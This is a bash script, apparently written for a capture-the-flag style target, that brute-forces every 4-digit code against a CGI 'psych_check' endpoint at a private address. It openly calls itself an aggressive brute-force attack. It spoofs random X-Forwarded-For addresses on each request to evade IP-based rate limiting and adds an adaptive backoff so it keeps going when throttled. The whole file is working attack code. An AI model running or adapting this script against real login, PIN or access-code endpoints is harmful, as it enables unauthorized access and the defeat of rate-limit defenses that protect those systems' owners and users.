#!/bin/bash

# Configuration
HOST="10.66.145.169:8080"
ENDPOINT="/cgi-bin/psych_check.sh"
URL="http://${HOST}${ENDPOINT}"
MIN_CODE=0
MAX_CODE=9999
BACKOFF_INCREMENT=5 # Amount to increase delay by if rate limit is hit
current_delay=0     # Current sleep time (0 means aggressive, no sleep)

RATE_LIMIT_ERROR='{"ok":false,"error":"rate_limit"}'
SUCCESS_PATTERN='"ok":true'

echo "--- Starting Aggressive Brute-Force Attack on Psych Door ---"
echo "Target: ${URL}"
echo "--- Attempting to bypass IP-based rate limit using X-Forwarded-For header. ---"
echo "---------------------------------------------------------------"

# Function to generate a random IPv4 address
generate_random_ip() {
    # Generates four random numbers between 1 and 254 for a valid-looking IP
    echo "$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1)"
}

# Function to perform the cURL request
submit_code() {
    local code_to_test=$1
    local response
    
    # Generate a new random IP for each request
    local RANDOM_IP=$(generate_random_ip)

    # Use curl to send the POST request. 
    # -s: Silent mode (no progress meter)
    # -X POST: Specify POST method
    # -H: Set Content-Type header
    # -H "X-Forwarded-For": Added to try and bypass IP-based rate limiting
    # -d: Set the POST data (URL-encoded code)
    response=$(curl -s -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "X-Forwarded-For: ${RANDOM_IP}" \
      -d "code=${code_to_test}" \
      "${URL}")
    
    echo "$response"
}

# Initialize counter for codes (0 to 9999)
i=$MIN_CODE

# Loop through all 4-digit codes using a while loop for manual control
while [ "$i" -le "$MAX_CODE" ]; do
    # Format the number as a 4-digit string with leading zeros
    CODE=$(printf "%04d" "$i")

    # Only sleep if the previous request failed due to rate limiting
    if [ "$current_delay" -gt 0 ]; then
        echo "[ATTEMPT: $CODE/$MAX_CODE] Retesting after backoff (Waiting ${current_delay}s...)"
        sleep "$current_delay"
    else
        # Aggressive attempt with no delay
        echo "[ATTEMPT: $CODE/$MAX_CODE] Trying code: ${CODE} (Aggressive attempt, no delay.)"
    fi

    # Submit the code and capture the response
    RESPONSE=$(submit_code "$CODE")

    # Check for success (e.g., {"ok":true, "flag":...})
    if echo "$RESPONSE" | grep -q "${SUCCESS_PATTERN}"; then
        echo "==============================================================="
        echo "🎉 SUCCESS! KEYCODE FOUND: ${CODE}"
        echo "SERVER RESPONSE: ${RESPONSE}"
        echo "==============================================================="
        exit 0
    fi

    # Check for rate limit error
    if echo "$RESPONSE" | grep -q "${RATE_LIMIT_ERROR}"; then
        # If rate limit is hit:
        
        # 1. Increase the backoff delay for the NEXT iteration.
        if [ "$current_delay" -eq 0 ]; then
            current_delay=$BACKOFF_INCREMENT
        else
            current_delay=$((current_delay + BACKOFF_INCREMENT))
        fi
        
        echo "🚨 RATE LIMIT HIT! Setting next wait to ${current_delay} seconds."
        # 2. DO NOT INCREMENT 'i' here. The while loop will retry the same CODE after the sleep.
    else
        # If the code was just incorrect (not rate-limited):
        
        # 1. Reset the backoff counter to ensure the next attempt is immediate.
        current_delay=0

        # 2. Print the non-success response for visibility
        if ! echo "$RESPONSE" | grep -q "${SUCCESS_PATTERN}"; then
            echo "  Result: ${RESPONSE}"
        fi
        
        # 3. INCREMENT 'i' to move to the next code.
        i=$((i + 1))
    fi

done

echo "--- Brute force finished. Keycode not found in range ${MIN_CODE}-${MAX_CODE}. ---"
